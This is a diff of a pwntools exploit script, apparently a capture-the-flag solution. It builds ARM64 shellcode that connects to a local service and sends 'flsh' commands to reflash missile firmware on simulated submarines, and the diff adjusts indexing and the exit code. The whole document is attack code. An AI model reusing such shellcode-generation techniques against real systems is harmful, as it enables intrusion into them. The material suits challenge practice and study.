@@ -1,13 +1,14 @@
 from pwn import *
 
-elf = context.binary = ELF("/home/kali/cybertalent/fracture")
+context.binary = ELF("/home/kali/cybertalent/fracture")
 
 command = b"flsh"
-firmware = "/firmware/missile.1.3.37.fw_sub5_signed"
-shellcode = "sub sp, sp, #0x100\n"
+submarine = 5
+shellcode = ""
+firmware = f"/firmware/missile.1.3.37.fw_sub{submarine}_signed"
 
 for j in range(16):
-    submarine = p16(4)
+    submarine = p16(submarine - 1)
     missile = p16(j)
     full_command = command + submarine + missile
     shellcode += shellcraft.connect("127.0.0.1", 1025)
@@ -19,8 +20,7 @@ for j in range(16):
     shellcode += shellcraft.mov("x11", "x0")
     shellcode += shellcraft.close("x12")
     shellcode += shellcraft.write(0x4, "sp", "x11")
-
-shellcode += shellcraft.exit(1)
+shellcode += shellcraft.exit(69)
 
 compiled_shellcode = asm(shellcode)
 print("Length of shellcode:", len(compiled_shellcode))
